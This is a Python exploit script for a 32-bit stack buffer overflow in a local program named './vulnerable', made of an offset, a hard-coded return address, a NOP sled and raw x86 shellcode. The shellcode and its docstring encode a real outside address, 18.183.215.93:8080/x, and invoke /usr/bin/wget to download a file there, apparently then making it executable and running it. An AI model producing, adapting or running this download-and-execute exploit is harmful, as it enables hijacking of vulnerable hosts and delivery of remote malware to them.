import sys
import tempfile
import os
import struct

from subprocess import call

"""
18.183.215.93:8080/x
"18.1" "83.2" "15.9" "3:80" "80/x"

1 -> 49(ASCII) -> 0x31
. -> 46(ASCII) -> 0x2E
...
"""

def conv(num):
    return struct.pack("<I", num)

def main():
    offset = 76 # buffer + 12 (ebp + 12)

    """
    check ESP
    gdb ./vulnerable
    break vulnerable_function
    run
    info registers esp

    """
    ret_addr = 0xffffd420

    shellcode = b"\x31\xc0\xb0\x02\xcd\x80\x31\xdb\x39\xd8\x74\x33\x3f\x31\xc0\xb0\x07\xbb\xff\xff\xff\xff\x31\xc9\x31\xd2\xcd\x80\x31\xc9\x31\xc0\x50\xb0\x0f\x6a\x78\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x31\xc0\x50\x6a\x78\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x6a\x0b\x58\x99\x52\x68\x38\x30\x2f\x78\x68\x33\x3a\x38\x30\x68\x31\x35\x2e\x39\x68\x38\x33\x2e\x32\x68\x31\x38\x2e\x31\x89\xe1\x52\x6a\x74\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

    nop_sled = b"\x90" * 100

    payload = b"A" * offset
    payload += conv(ret_addr)
    payload += nop_sled
    payload += shellcode

    call(["./vulnerable", payload])

if __name__ == '__main__':
    main()